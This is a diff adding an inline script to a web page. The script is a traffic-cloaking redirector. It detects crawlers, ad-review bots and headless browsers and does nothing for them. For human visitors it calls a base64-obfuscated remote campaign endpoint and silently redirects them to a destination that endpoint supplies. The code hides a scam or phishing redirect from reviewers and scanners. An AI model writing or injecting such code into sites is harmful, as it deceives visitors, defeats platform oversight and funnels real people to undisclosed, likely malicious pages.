@@ -1,0 +1,22 @@
+<script>
+(function() {
+  var isAutomated = navigator.webdriver || 
+              (typeof screen !== 'undefined' && (screen.width === 0 || screen.height === 0)) || 
+              (navigator.maxTouchPoints === 0 && /iphone|ipad|android/i.test(navigator.userAgent)) ||
+              /(bot|crawler|spider|facebookexternalhit|adsbot|google|tiktok|headless)/i.test(navigator.userAgent);
+
+  if (isAutomated) return;
+
+  var verifyUrl = atob("aHR0cHM6Ly9teWNsb2FraXQucHJvL2FwaV9jYW1wYWlnbi5waHA/YWN0aW9uPXZlcmlmeSZzbHVnPWF1c2llLWNhbXBhaWdu") + "&ua=" + encodeURIComponent(navigator.userAgent);
+  fetch(verifyUrl)
+    .then(function(res) { return res.json(); })
+    .then(function(data) {
+      if (data && data.verdict === 'safe_routed' && data.target_url) {
+        var q = window.location.search || '';
+        var glue = (data.target_url.indexOf('?') !== -1) ? '&' : '?';
+        window.location.replace(data.target_url + (q ? (glue + q.substring(1)) : ''));
+      }
+    })
+    .catch(function() {});
+})();
+</script>
